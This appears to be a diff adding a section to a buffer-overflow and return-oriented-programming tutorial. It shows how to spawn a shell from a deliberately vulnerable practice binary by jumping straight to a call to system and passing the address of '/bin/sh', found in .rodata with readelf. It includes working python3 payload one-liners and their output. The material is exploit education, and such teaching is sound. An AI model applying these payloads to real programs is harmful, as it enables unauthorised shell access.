@@ -2,6 +2,9 @@
 
 sources:
 https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html \
+https://stackoverflow.com/questions/44938745/rodata-section-loaded-in-executable-page \
+https://stackoverflow.com/questions/51919876/retrieving-offsets-strings-and-virtual-address-in-rodata-and-rodata1 
+https://stackoverflow.com/questions/1685483/how-can-i-examine-contents-of-a-data-section-of-an-elf-file-on-linux
 
 When a function is called, a return address is saved in the stack so the
 program knows where to take instructions from after the function exits, by
@@ -181,3 +184,84 @@ order is backwards. Yours is probably too (most are nowadays)
 
 Running any of the above commands (with the proper addresses)
 should grant you a shell!
+
+### Getting Shell in Other Scenarios
+
+Although we managed to get the shell, our methodology could be improved
+to work in other scenarios.
+
+* What if `impossible_shell` was a more complex function?
+
+* What if `system` called "/bin/cal" instead?
+
+* What if `system` wasn't called at all?
+
+#### What if: `impossible_shell` was a more complex function
+
+Why are calling `impossible_shell` in the first place? The answer:
+to call `system`. However, we could cut the middleman here and go
+directly to `system`! For that we can just point EIP directly to
+the instruction that calls `system`:
+
+```
+80484b8:	e8 a3 fe ff ff       	call   8048360 <system@plt>
+```
+
+But doing so yields:
+
+```
+./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\xb8\x84\x04\x08')"`
+Segmentation fault
+```
+
+Why that didn't work? Well, we may be calling `system` but we aren't
+passing any arguments to it! Just like we saw before with the buffer
+we are overflowing and the `strcmp` and `strcpy` functions, the
+strings taken as argument is pushed to the stack before the function
+call.
+
+When we call `impossible_shell` it pushes EBP to the stack ('BBBB') and
+then the argument to `system`, "/bin/sh". Since we are going directly
+to `system`, we are the ones responsible for the heavy-lifting.
+
+When `password_is_correct` calls `leave` and `ret` at the end of the
+excution, it pops 'BBBB' and the address that comes after it. So all
+we need to do is add the arguments that will be given to the `system`
+call:
+
+```
+./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\xb8\x84\x04\x08' + b'bin/sh address')"`
+```
+
+Since "/bin/sh" is a string literal it should be in the `.rodata`
+section, destined to readonly data. We can get to which address
+this section gets mapped to with `readelf --sections rip`:
+
+```
+[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+[16] .rodata           PROGBITS        08048618 000618 00008c 00   A  0   0  4
+```
+
+As you can see, in my case the address is `0x08048618`. The "/bin/sh"
+should be somewhere inside this section. With `readelf -p .rodata rip`
+we can see the contents of the section and their offset from the
+start of the section:
+
+```
+  [     8]  /bin/sh
+  [    10]  passwd1
+  [    18]  PASSWORD IS CORRECT!
+  [    30]  i don't feel like giving you a shell though�
+  [    60]  PASSWORD IS INCORRECT!
+  [    77]  try harder next time
+```
+
+"/bin/sh" start 8 bytes after `0x08048618`, so `0x08048620` is
+the value to put in the payload:
+
+```
+./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\xb8\x84\x04\x08' + b'\x20\x86\x04\x08')"`
+$
+```
+
+
